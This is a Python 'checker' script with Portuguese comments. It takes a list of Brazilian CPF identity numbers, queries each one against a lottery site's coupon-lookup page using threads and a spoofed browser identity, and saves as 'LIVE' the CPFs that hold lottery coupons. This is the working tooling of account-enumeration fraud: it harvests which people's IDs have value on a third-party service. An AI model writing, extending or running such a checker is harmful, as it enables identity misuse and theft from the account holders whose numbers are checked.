# megamania_checker_fixed.py
import requests
import re
import time
import json
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from bs4 import BeautifulSoup

# Desabilita warnings SSL
urllib3.disable_warnings()

class MegaManiaChecker:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "pt-BR,pt;q=0.9,en;q=0.8",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
            "Cache-Control": "max-age=0"
        })
        
        # Contadores
        self.total_checked = 0
        self.total_live = 0
        self.total_die = 0
        
    def format_cpf(self, cpf):
        """Formata CPF com pontos e traço"""
        cpf_clean = re.sub(r'\D', '', cpf)
        if len(cpf_clean) != 11:
            return None
        return f"{cpf_clean[:3]}.{cpf_clean[3:6]}.{cpf_clean[6:9]}-{cpf_clean[9:]}"
    
    def check_cpf(self, cpf):
        """Verifica um CPF"""
        cpf_formatted = self.format_cpf(cpf)
        if not cpf_formatted:
            return "DIE", "CPF inválido"
            
        try:
            # Faz a requisição
            url = f"https://consulta.megamaniadasorte.com.br/meus-cupons?cpf={cpf_formatted}"
            response = self.session.get(url, timeout=30, verify=False)
            
            # Analisa o HTML
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Verifica se está no formulário de CPF (não logado)
            cpf_form = soup.find('form', {'action': lambda x: x and '/meus-cupons/ver' in x})
            cpf_input = soup.find('input', {'id': 'cpf'})
            
            if cpf_form or cpf_input:
                # Está no formulário = DIE
                return "DIE", "Sem cadastro"
                
            # Procura por indicadores de cupons
            # 1. Procura a div que contém os cupons
            cupons_container = soup.find('div', {'class': re.compile('cupons|tickets|titles|meus-titulos')})
            
            # 2. Procura por texto indicando cupons
            page_text = soup.get_text()
            
            # Indicadores de LIVE (tem cupons)
            if any(indicator in page_text.lower() for indicator in [
                'você possui', 'seus títulos', 'meus títulos', 
                'cupom', 'título', 'número da sorte', 'dezenas',
                'sorteio', 'concurso'
            ]):
                # Tenta extrair quantidade de cupons
                cupons_match = re.search(r'(\d+)\s*(cupons?|títulos?)', page_text, re.IGNORECASE)
                if cupons_match:
                    num_cupons = cupons_match.group(1)
                    return "LIVE", f"{num_cupons} cupons"
                else:
                    return "LIVE", "Tem cupons"
            
            # Indicadores de sem cupons
            if any(indicator in page_text.lower() for indicator in [
                'não possui', 'nenhum título', 'sem títulos', 
                'não encontrado', 'cadastre-se', 'criar conta'
            ]):
                return "DIE", "Sem cupons"
                
            # Se chegou aqui, não conseguiu determinar
            # Salva HTML para debug
            with open(f"debug_{cpf}.html", "w", encoding="utf-8") as f:
                f.write(response.text)
                
            return "UNKNOWN", "Não foi possível determinar"
            
        except requests.exceptions.Timeout:
            return "ERROR", "Timeout"
        except Exception as e:
            return "ERROR", str(e)[:50]
    
    def process_list(self, cpf_list, max_workers=5):
        """Processa lista de CPFs"""
        print(f"\n🎯 MegaMania Checker v5.0")
        print(f"📍 Site: consulta.megamaniadasorte.com.br")
        print(f"\n📋 {len(cpf_list)} CPFs carregados")
        
        # Teste com primeiro CPF
        print(f"\n🧪 Testando com primeiro CPF...")
        test_cpf = cpf_list[0]
        status, msg = self.check_cpf(test_cpf)
        print(f"   CPF: {self.format_cpf(test_cpf)}")
        print(f"   Status: {status}")
        print(f"   Info: {msg}")
        
        # Se o primeiro deu DIE no formulário, provavelmente todos darão
        if status == "DIE" and msg == "Sem cadastro":
            print("\n⚠️  AVISO: Site está retornando formulário para todos CPFs!")
            print("   Isso indica que:")
            print("   1. O site mudou o funcionamento")
            print("   2. Precisa de autenticação prévia")
            print("   3. Está bloqueando requisições automatizadas")
            
        input("\n▶️  Continuar com todos? (s/n): ")
        
        # Processa todos
        print(f"\n🚀 Processando {len(cpf_list)} CPFs...\n")
        
        # Abre arquivo de saída
        with open("live.txt", "w") as live_file:
            
            with ThreadPoolExecutor(max_workers=max_workers) as executor:
                # Submete tarefas
                future_to_cpf = {
                    executor.submit(self.check_cpf, cpf): cpf 
                    for cpf in cpf_list
                }
                
                # Processa resultados
                for i, future in enumerate(as_completed(future_to_cpf), 1):
                    cpf = future_to_cpf[future]
                    status, msg = future.result()
                    
                    self.total_checked += 1
                    
                    if status == "LIVE":
                        self.total_live += 1
                        live_file.write(f"{cpf}\n")
                        live_file.flush()
                        print(f"[{i}/{len(cpf_list)}] ✅ LIVE - {self.format_cpf(cpf)} ({msg})")
                    elif status == "DIE":
                        self.total_die += 1
                        print(f"[{i}/{len(cpf_list)}] ❌ DIE - {self.format_cpf(cpf)} ({msg})")
                    else:
                        print(f"[{i}/{len(cpf_list)}] ⚠️ {status} - {self.format_cpf(cpf)} ({msg})")
                    
                    # Delay entre requisições
                    time.sleep(0.5)
        
        # Resumo final
        print(f"\n{'='*50}")
        print(f"📊 RESUMO FINAL:")
        print(f"   Total verificados: {self.total_checked}")
        print(f"   ✅ LIVE: {self.total_live}")
        print(f"   ❌ DIE: {self.total_die}")
        print(f"   📁 Lives salvos em: live.txt")
        print(f"{'='*50}")

def main():
    # Lê lista de CPFs
    try:
        with open("lista.txt", "r") as f:
            cpf_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print("❌ Arquivo lista.txt não encontrado!")
        return
    
    # Remove duplicados
    cpf_list = list(set(cpf_list))
    
    # Cria checker e processa
    checker = MegaManiaChecker()
    checker.process_list(cpf_list, max_workers=3)

if __name__ == "__main__":
    main()